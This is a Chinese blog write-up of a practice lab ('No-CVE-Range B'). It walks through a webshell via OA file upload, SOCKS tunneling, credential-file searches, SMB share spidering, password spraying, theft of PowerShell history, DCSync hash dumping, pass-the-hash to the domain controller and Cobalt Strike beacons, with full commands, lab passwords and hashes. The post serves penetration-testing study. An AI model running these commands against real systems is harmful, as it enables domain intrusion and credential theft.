

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="manic">
  <meta name="keywords" content="">
  
    <meta name="description" content="靶场环境来自：棉花糖——靶机-No-CVE-Range系列靶场B 大概拓扑如下：  1、端口扫描与服务探测通达OA任意文件上传，传了一个马，用蚁剑连接 发现有个192.168.10.0&#x2F;24段的，搭个代理访问 先搭建个隧道，本来想用Stowawa的，没成功 用了一个http协议的工具suo5（后面把suo5代理换成了reGeorg，可以看”在搭建代理链过程中遇到问题”） 因为网站是php">
<meta property="og:type" content="article">
<meta property="og:title" content="靶机-No-CVE-Range系列靶场B">
<meta property="og:url" content="http://example.com/2025/12/10/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/index.html">
<meta property="og:site_name" content="manic的小站">
<meta property="og:description" content="靶场环境来自：棉花糖——靶机-No-CVE-Range系列靶场B 大概拓扑如下：  1、端口扫描与服务探测通达OA任意文件上传，传了一个马，用蚁剑连接 发现有个192.168.10.0&#x2F;24段的，搭个代理访问 先搭建个隧道，本来想用Stowawa的，没成功 用了一个http协议的工具suo5（后面把suo5代理换成了reGeorg，可以看”在搭建代理链过程中遇到问题”） 因为网站是php">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/%E5%B0%81%E9%9D%A2.png">
<meta property="article:published_time" content="2025-12-10T08:26:55.000Z">
<meta property="article:modified_time" content="2025-12-11T06:37:23.207Z">
<meta property="article:author" content="manic">
<meta property="article:tag" content="域环境">
<meta property="article:tag" content="WP">
<meta property="article:tag" content="代理链">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/%E5%B0%81%E9%9D%A2.png">
  
  
  
  <title>靶机-No-CVE-Range系列靶场B - manic的小站</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/fluid-extension.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"GI2ZD3OR5b6C0PJDuqoKtFPs-gzGzoHsz","app_key":"A3XJlxUOakFURqQeV3D3B29x","server_url":"https://gi2zd3or.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>manic&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="靶机-No-CVE-Range系列靶场B"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-12-10 16:26" pubdate>
          2025年12月10日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          6.8k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          57 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">靶机-No-CVE-Range系列靶场B</h1>
            
            
              <div class="markdown-body">
                
                <p>靶场环境来自：棉花糖——靶机-No-CVE-Range系列靶场B</p>
<p>大概拓扑如下：</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251210162221648.png" srcset="/img/loading.gif" lazyload alt="image-20251210162221648"></p>
<h2 id="1、端口扫描与服务探测"><a href="#1、端口扫描与服务探测" class="headerlink" title="1、端口扫描与服务探测"></a>1、端口扫描与服务探测</h2><p>通达OA任意文件上传，传了一个马，用蚁剑连接</p>
<p>发现有个192.168.10.0&#x2F;24段的，搭个代理访问</p>
<p>先搭建个隧道，本来想用Stowawa的，没成功</p>
<p>用了一个http协议的工具suo5（后面把suo5代理换成了reGeorg，可以看”在搭建代理链过程中遇到问题”）</p>
<p>因为网站是php语言写的，所以把.php文件上传到根目录作为服务端</p>
<p>客户端如下</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251114112954992.png" srcset="/img/loading.gif" lazyload alt="image-20251114112954992"></p>
<p>配置proxifier</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251114113438321.png" srcset="/img/loading.gif" lazyload alt="image-20251114113438321"></p>
<p>192.168.111.20主机里面有有一个密码本</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">cmd：dir /S /B <span class="hljs-strong">*pass*</span>.txt == <span class="hljs-strong">*pass*</span>.xml == <span class="hljs-strong">*pass*</span>.ini == <span class="hljs-strong">*cred*</span> == <span class="hljs-strong">*vnc*</span> == <span class="hljs-strong">*.config*</span> == <span class="hljs-strong">*user*</span><br><br>powershell：Get-ChildItem -Path C:\Users\ -Recurse -ErrorAction SilentlyContinue -Include <span class="hljs-strong">*pass*</span>.txt, <span class="hljs-strong">*pass*</span>.xml, <span class="hljs-strong">*pass*</span>.ini, <span class="hljs-strong">*cred*</span>, <span class="hljs-strong">*vnc*</span>, <span class="hljs-strong">*.config, *user*</span> -File | Select-Object FullName, Length, LastWriteTime<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251114141151805.png" srcset="/img/loading.gif" lazyload alt="image-20251114141151805"></p>
<p><strong>192.168.10.128  alice&#x2F;P@ssw0rd</strong></p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251114141212869.png" srcset="/img/loading.gif" lazyload alt="image-20251114141212869"></p>
<p>将fscan传到第一台主机上，进行内网网段扫描，存在一台主机192.168.10.128</p>
<p>进行端口扫描，fscan -h 192.168.10.128 -p 1-65535 -o fscan.txt</p>
<h2 id="2、3389远程登录"><a href="#2、3389远程登录" class="headerlink" title="2、3389远程登录"></a>2、3389远程登录</h2><p>注意，要加域前缀（例如 <code>domain\username</code>）</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251114155102391.png" srcset="/img/loading.gif" lazyload alt="image-20251114155102391"></p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251114155507520.png" srcset="/img/loading.gif" lazyload alt="image-20251114155507520"></p>
<p>信息收集，还有一个域环境，网段172.16.10.0&#x2F;24</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119130804720.png" srcset="/img/loading.gif" lazyload alt="image-20251119130804720"></p>
<h2 id="3、域内信息收集"><a href="#3、域内信息收集" class="headerlink" title="3、域内信息收集"></a>3、域内信息收集</h2><p>这里记下工具BloodHound，可视化图形显示域环境中的关系（你会说，你咋就写这点呢，因为我第一次用，不太会用）</p>
<p>工具安装使用参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/288370.html">https://www.freebuf.com/articles/web/288370.html</a></p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251210150901895.png" srcset="/img/loading.gif" lazyload alt="image-20251210150901895"></p>
<h2 id="5、内网穿透搭建"><a href="#5、内网穿透搭建" class="headerlink" title="5、内网穿透搭建"></a>5、内网穿透搭建</h2><p>搭建个代理链，物理机访问172.16段</p>
<p>在reGeorg搭建好的基础上</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">98</span>执行：建立一个反向 SOCKS 代理，在本机的 <span class="hljs-number">1080</span> 端口启动 SOCKS5 代理，连接到远程主机的 <span class="hljs-number">7778</span> 端口<br><span class="hljs-attribute">ew_for_Win</span>.exe -s rcsocks -l <span class="hljs-number">1080</span> -e <span class="hljs-number">7778</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118164232384.png" srcset="/img/loading.gif" lazyload alt="image-20251118164232384"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">128</span>执行：运行反向连接命令，连接到 <span class="hljs-number">192.168.10.98</span>远程的 <span class="hljs-number">7778</span> 端口<br><span class="hljs-attribute">ew_for_Win</span>.exe -s rssocks -d <span class="hljs-number">192.168.10.98</span> -e <span class="hljs-number">7778</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118164307170.png" srcset="/img/loading.gif" lazyload alt="image-20251118164307170"></p>
<p>Pro设置</p>
<p>这里的6665就是上面搭的1111</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118170350212.png" srcset="/img/loading.gif" lazyload alt="image-20251118170350212"></p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118170433336.png" srcset="/img/loading.gif" lazyload alt="image-20251118170433336"></p>
<p>测试是否搭建成功</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">.\nxc<span class="hljs-selector-class">.exe</span> smb <span class="hljs-number">172.16</span>.<span class="hljs-number">10.129</span> -u alice -<span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">P</span><span class="hljs-keyword">@ssw0rd</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119160517587.png" srcset="/img/loading.gif" lazyload alt="image-20251119160517587"></p>
<p>没啥问题，可以通过物理机访问到172.16段</p>
<h2 id="6、共享目录枚举与敏感信息获取"><a href="#6、共享目录枚举与敏感信息获取" class="headerlink" title="6、共享目录枚举与敏感信息获取"></a>6、共享目录枚举与敏感信息获取</h2><p>本来想在物理机上枚举172网段SMB共享目录，运行命令以后，web服务就挂，需要重启靶场才行，只能在内网主机上执行了</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">列出所有可访问的共享文件夹：.\nxc<span class="hljs-selector-class">.exe</span> smb <span class="hljs-number">172.16</span>.<span class="hljs-number">10.0</span>/<span class="hljs-number">24</span> -u alice -<span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">P</span><span class="hljs-keyword">@ssw0rd</span> --shares<br></code></pre></td></tr></table></figure>

<ul>
<li>发现172.16.10.129自定义共享 xya，有读权限</li>
</ul>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119163719297.png" srcset="/img/loading.gif" lazyload alt="image-20251119163719297"></p>
<p>爬取目标共享文件夹名为 “xya”内所有文件</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">.\nxc<span class="hljs-selector-class">.exe</span> smb <span class="hljs-number">172.16</span>.<span class="hljs-number">10.0</span>/<span class="hljs-number">24</span> -u alice -<span class="hljs-selector-tag">p</span> P@ssw0rd -d xya<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--spider</span> xya <span class="hljs-attr">--pattern</span> .<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119164708451.png" srcset="/img/loading.gif" lazyload alt="image-20251119164708451"></p>
<p>临时挂载 SMB 共享、读取文件、然后删除驱动器映射</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs elixir">cmd：net <span class="hljs-keyword">use</span> <span class="hljs-symbol">Z:</span> \\<span class="hljs-number">172.16</span>.<span class="hljs-number">10.129</span>\xya /<span class="hljs-symbol">user:</span>xya.com\alice P<span class="hljs-variable">@ssw0rd</span> &amp;&amp; type <span class="hljs-symbol">Z:</span>\<span class="hljs-title class_">Memo</span>.txt &amp;&amp; net <span class="hljs-keyword">use</span> <span class="hljs-symbol">Z:</span> /delete<br><br>arlpass<br>anonymous<br>root<br><span class="hljs-number">12345678</span><br>private<br><span class="hljs-number">123</span><br>zxsoft1234!@<span class="hljs-comment">#$</span><br><span class="hljs-number">123456</span><br>admin<br>system<br>hicomadmin<br>eyou_admin<br>cyouadmin<br><span class="hljs-comment">#NAME?</span><br>leadsec.auditor<br><span class="hljs-number">12345</span><br>cnoa.cn2010password<br>leadsec<span class="hljs-variable">@7766</span><br>admin123<br>leadsec<br>leadsec32<br>leadsec.useradmin<br>leadsec.waf<br>admin*<span class="hljs-title class_">PWD</span><br>firewall<br><span class="hljs-title class_">Xyacontribution1</span>!<br>hillstone<br>guest<br>qxcomm1680<br>qxcommsupport<br>qxcomm1688<br>qxcommsuport<br>sua_password<span class="hljs-variable">$123</span><br>sa_password<span class="hljs-variable">$123</span><br>password<span class="hljs-variable">$123</span><br>venus70<br>venus60<br>sys<span class="hljs-variable">$admin</span><span class="hljs-variable">@028</span><br>freesvr<br>csmp<span class="hljs-variable">@CLOUD987</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119165547883.png" srcset="/img/loading.gif" lazyload alt="image-20251119165547883"></p>
<h2 id="7、域用户枚举与密码喷洒"><a href="#7、域用户枚举与密码喷洒" class="headerlink" title="7、域用户枚举与密码喷洒"></a>7、域用户枚举与密码喷洒</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nxc<span class="hljs-selector-class">.exe</span> smb <span class="hljs-number">172.16</span>.<span class="hljs-number">10.0</span>/<span class="hljs-number">24</span> -u user<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> pass.txt<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251210160741099.png" srcset="/img/loading.gif" lazyload alt="image-20251210160741099"></p>
<h2 id="8、本地权限排查与凭据挖掘"><a href="#8、本地权限排查与凭据挖掘" class="headerlink" title="8、本地权限排查与凭据挖掘"></a>8、本地权限排查与凭据挖掘</h2><p>你会有疑问，这怎么用CS执行了？因为这个靶场不是连续做完的，截图就不连贯，可以看下面的”上线到CS”</p>
<p>从PowerShell历史文件，获取高权限用户凭据（calue&#x2F;LongliveChina1!）</p>
<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs r">用于窃取所有用户PowerShell命令历史记录的命令<br>powerpick Get<span class="hljs-operator">-</span>ChildItem <span class="hljs-operator">-</span>Path <span class="hljs-string">&quot;C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\&quot; -Recurse -ErrorAction SilentlyContinue | ForEach-Object &#123; &quot;</span>`n=== $($_.FullName) ===&quot;; Get-Content $_.FullName -ErrorAction SilentlyContinue &#125; | Out-File C:\Windows\Temp\all_history.txt<br><br>Get-ChildItem -Path &quot;C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\&quot; <br>              -Recurse <br>              -ErrorAction SilentlyContinue<br>-Path	C:\Users\*\AppData\...	搜索所有用户的 PSReadLine 目录<br>-Recurse	-	递归搜索子目录<br>-ErrorAction	SilentlyContinue	忽略权限错误（无法访问的用户目录）<br><br>download C:\Windows\Temp\all_history.txt<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128172051341.png" srcset="/img/loading.gif" lazyload alt="image-20251128172051341"></p>
<p><strong>calue&#x2F;LongliveChina1!</strong></p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128172130727.png" srcset="/img/loading.gif" lazyload alt="image-20251128172130727"></p>
<h2 id="9、DCsync权限识别与利用"><a href="#9、DCsync权限识别与利用" class="headerlink" title="9、DCsync权限识别与利用"></a>9、DCsync权限识别与利用</h2><p>通过BloodHound确认用户（calue）具备DCsync权限，使用secretsdump.py工具导出域内用户哈希（含域管理员Administrator哈希）</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251211101136370.png" srcset="/img/loading.gif" lazyload alt="image-20251211101136370"></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ropnop/im</span>packet_static_binaries/releases<br><br>物理机：D:\tools\secretsdump_windows.exe xya/calue:<span class="hljs-string">&#x27;LongliveChina1!&#x27;</span>@<span class="hljs-number">172.16</span>.<span class="hljs-number">10.130</span> -dc-ip <span class="hljs-number">172.16</span>.<span class="hljs-number">10.130</span> -just-dc-user administrator<br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251209171211399.png" srcset="/img/loading.gif" lazyload alt="image-20251209171211399"></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">Administrator</span><span class="hljs-symbol">:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:ece39e1190e04b11c0c21797feb2ec1e</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>:<br>[*] <span class="hljs-title class_">Kerberos</span> keys grabbed<br><span class="hljs-title class_">Administrator</span><span class="hljs-symbol">:aes256-cts-hmac-sha1-</span><span class="hljs-number">96</span><span class="hljs-symbol">:c64e5ebc5f7b7ac425200b12eac0dfb70e36377052547242b185683eac422dcf</span><br><span class="hljs-title class_">Administrator</span><span class="hljs-symbol">:aes128-cts-hmac-sha1-</span><span class="hljs-number">96</span><span class="hljs-symbol">:e126327fd843bfc06141b711523f003f</span><br><span class="hljs-title class_">Administrator</span><span class="hljs-symbol">:des-cbc-md5</span><span class="hljs-symbol">:ead0b585e9fd3e5d</span><br></code></pre></td></tr></table></figure>



<h2 id="10、哈希传递登录与域控权限获取"><a href="#10、哈希传递登录与域控权限获取" class="headerlink" title="10、哈希传递登录与域控权限获取"></a>10、哈希传递登录与域控权限获取</h2><p>利用域管理员哈希，通过evil-winrm工具实现哈希传递登录域控制器（172.16.10.130）</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Hackplayers/</span>evil-winrm<br><br>使用前进行安装了gem install evil-winrm，参考文章：https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_66635990/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">135574584</span><br><br>物理机：ruby evil-winrm.rb -u administrator -H ece39e1190e04b11c0c21797feb2ec1e -i <span class="hljs-number">172.16</span>.<span class="hljs-number">10.130</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251210142332649.png" srcset="/img/loading.gif" lazyload alt="image-20251210142332649"></p>
<h2 id="上线到CS"><a href="#上线到CS" class="headerlink" title="上线到CS"></a>上线到CS</h2><h3 id="第一台主机上线到CS"><a href="#第一台主机上线到CS" class="headerlink" title="第一台主机上线到CS"></a>第一台主机上线到CS</h3><p>木马上传到蚁剑运行就行</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128112658485.png" srcset="/img/loading.gif" lazyload alt="image-20251128112658485"></p>
<h3 id="第二台主机上线CS"><a href="#第二台主机上线CS" class="headerlink" title="第二台主机上线CS"></a>第二台主机上线CS</h3><p>参考文章：<a target="_blank" rel="noopener" href="https://www.lmboke.com/archives/nei-wang-shen-tou-dai-li-socksxie-yi-lu-you-bu-chu-wang-hou-shen-tou-tong-xun-cs">https://www.lmboke.com/archives/nei-wang-shen-tou-dai-li-socksxie-yi-lu-you-bu-chu-wang-hou-shen-tou-tong-xun-cs</a></p>
<p>思路：在192.168.10.128执行正向连接的木马程序，然后让192.168.10.98去主动连接192.168.10.128</p>
<p>cs添加监听器</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128095755182.png" srcset="/img/loading.gif" lazyload alt="image-20251128095755182"></p>
<p>生成exe程序</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128095847898.png" srcset="/img/loading.gif" lazyload alt="image-20251128095847898"></p>
<p>上传到192.168.10.128的系统执行exe程序。来到10.98的会话中执行如下命令</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">命令：connect ip port。connect <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.128</span> <span class="hljs-number">4433</span><br></code></pre></td></tr></table></figure>

<p>成功上线</p>
<p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128095939020.png" srcset="/img/loading.gif" lazyload alt="image-20251128095939020"></p>
